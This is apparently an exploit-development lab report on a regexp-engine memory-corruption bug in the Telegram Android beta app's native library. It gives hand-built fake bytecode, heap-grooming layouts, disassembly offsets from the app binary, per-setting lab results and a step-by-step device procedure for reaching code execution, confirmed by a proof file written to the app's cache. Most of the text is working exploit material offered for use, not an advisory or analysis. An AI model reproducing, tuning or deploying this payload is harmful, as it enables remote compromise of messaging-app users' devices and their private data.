# PR #1827 string-filler (direction-independent) payload — lab result

Deliverable: `telegramandroidwidget/lab/regexp1827_arena/widget_poc_1827_strfill.html`
(device constants inline; same code as `strfill_device.js`).
Lab twin: `strfill_lab.js`. Device/DB untouched.

## 1. Why this variant

The `{}`-filler variant gave `forged=0, win=-1` on the phone. The app binary
confirms the fake-program encoding is **not** the problem (independent IDA
check; see §2), and the fast-path probe proves attacker bytes reach `lre_exec`.
The remaining difference is which block sits at `capture+80` and which way the
arena free list walks. If that block is a class-80 `{}` filler, a `set_i32`
write lands on its GC link, not on a JSString `len` — `forged=0`.

This payload makes the filler itself 47-char class-80 strings, allocated both
before and after `tmp`, so the forward neighbour of the capture is a string
whichever way the allocator walks:

```
big (pre-allocated 4 KB trigger block)
pre[]  + PRE 47-char class-80 strings   (A..Z, 47 chars, flat)
strs[] + NSTR 47-char class-80 strings  (a..z, after tmp)
tmp = {}                                (freed; capture reuses it)
ta = Uint8Array(80); v1; v2
tmp = null
```

Fake program header + body (89-byte body inside the 11,623-byte reclaim; `cc=4, rc=1`, `bytecode_len=89`):

```
00 00 04 01 59 00 00 00         flags=0 cc=4 rc=1 bytecode_len=89
13 00 14 00                     save_start 0; save_end 0
1b 02 ff ff ff 7f               block 1 +0  (len)
1b 0c .. 1b 16 .. 1b 20 ..      blocks 2..4 +0
1b 2a .. 1b 34 .. 1b 3e ..      blocks 5..7 +0
1b 48 ff ff ff 7f               block 8 +0
1b 5a .. 1b 64 .. 1b 6e ..      blocks 9..11 +64 (count candidates)
1b 78 .. 1b 82 .. 1b 8c ..      blocks 12..14 +64
10                              match
```

`pc0=10n-8` → idx `10n` → `capture+80n` (block n +0); `pc0=10b` → idx
`10b+8` → `capture+80b+64` (block b +64). `NSTR + COUNT_BLOCKS = 14` keeps all
`SAVE_CAPTURE_CHECK` pushes inside the 32-element static executor stack.

After the trigger, **all** pre and post strings are scanned for
`.length > 1e6` (before the count anchor), then each corrupted string is used
as a forward OOB window to locate `ta` (flags `0x1a`, `class_id 24`) and
`v1/v2` (`class_id 2`). Markers always carry `f=<forged> w=<winner>
k=<taK>` so a failed run still reports the layout.

## 2. Encoding is correct (independent IDA check)

App binary `lib/arm64-v8a/libtmessages.49.so`, IDA database
`libtmessages_49_arm64_widget_annotated.i64`:

* `lre_exec` at `0x17a9ce4`; dispatch `switch (*pc)` has cases `1..0x2C`.
* `case 0x13/0x14` (save_start/save_end) body:
  `idx = (opcode - 19) + 2*operand` after `operand < capture_count` check.
* `case 0x1B` (set_i32) body:
  `idx = pc[0] + 2*capture_count`, `val = *(u32*)(pc+1)`, `pc += 6`.
* `case 0x10` = match.
* The probe's `19 00 20 00 16` was a decimal/hex misread; the builder emits
  `13 00 14 00` (19/20 decimal). The probe aborted because zero bytes were
  left between `save_end` and `match` (opcode 0 = jump-table default abort);
  the payload has no zero gaps.
* header: `capture_count = bc_buf[2]`; capture slots zeroed for `2*cc`;
  opcode stream starts at `bc_buf+8` (same as v0.17.0).
* caller `JS_RegExpDelete` at `0x17651cc`; the `lre_exec` call is at
  `0x1765528` (= `JS_RegExpDelete+0x35c`, matching the device backtrace).

This matches the reverse agent's jump-table result (opcode 27 -> set_i32 at
`0x17aa7e8`). **No corrected fake-program bytes are needed for the encoding**;
the bytes above are correct for the app.

## 3. Lab result (release arena build, `verify_build/lab_regexp_rel`)

| PRE | markers | proof |
|---|---|---|
| 0 | `f=6 w=0 k=9` → `HOOKED`/`AFTER` | yes |
| 64 | `f=8 w=-1 k=-1` → `NO_WINDOW` | no |
| 128 | `f=8 w=0 k=9` → `HOOKED`/`AFTER` | yes (3/3) |
| 256 | `f=8 w=0 k=9` → `HOOKED`/`AFTER` | yes (3/3) |
| 512 | `f=8 w=0 k=9` → `HOOKED`/`AFTER` | yes (3/3) |
| 1024 | `f=1 w=-1 k=-1` → `NO_WINDOW` | no |

`PRE=512` is the delivered default (8/8 forged, winner 0, ta at relative
block 9, values `offV1=88`). `PRE=64` reproduces the device-like failure
**with forged strings**: `f=8` but no corrupted string has `ta` in its forward
window (`k=-1`). That distinguishes “no string got the write” (`f=0`) from
“`ta` is not forward of the strings” (`f>0, k=-1`).

The post-`AFTER` SIGSEGV in the lab is the harness's `JS_ComputeMemoryUsage`
walking the v1/v2 counts set to `0x7fffffff`; the proof is written and `AFTER`
printed before it.

Device-constant payload on the lab build stops at `NO_CTX f=8 w=0 k=9`
(expected wrong PIE) with no writes to the hook.

## 4. Device procedure

1. Run `widget_poc_1827_strfill.html` (one synchronous `replace`, 6 MiB).
2. Read `R1827:` markers:
   * `f>0 w>=0 k>=0` → strings+ta found forward; if the next marker is
     `NO_ANCHOR`, the count candidates missed `ta` (shift the
     `COUNT_BLOCKS` window); if `HOOKED`/`AFTER`, check the proof file
     `/data/user/0/org.telegram.messenger.beta/cache/rce_proof`.
   * `f>0 w>=0 k=-1` → strings are forward but `ta` is not; the allocator
     direction puts `ta` behind them. Next step: allocate a second victim set
     before the pre strings (or move `ta` before `tmp`) so one set is forward;
     keep the pre-string count small enough that the second set stays within
     the ~25-block (2040 B) reach.
   * `f=0` → even the string fillers did not receive a write: the reclaim or
     the capture class is still wrong (not the opcode encoding).
3. Tune `CFG.PRE` (0/64/128/256/512/1024) if the phase is wrong; keep
   `NSTR + COUNT_BLOCKS.length <= 14`.

## 5. Files

* `lab/regexp1827_arena/widget_poc_1827_strfill.html` — device payload.
* `lab/regexp1827_arena/strfill_device.js`, `strfill_lab.js`,
  `strfill_template.js`.
* Evidence: `notes/evidence_regexp1827_arena/sf_0.out`, `sf_64.out`,
  `sf_128.out`, `sf_256.out`, `sf_512.out`, `sf_1024.out`, `sf_dev_lab.out`.
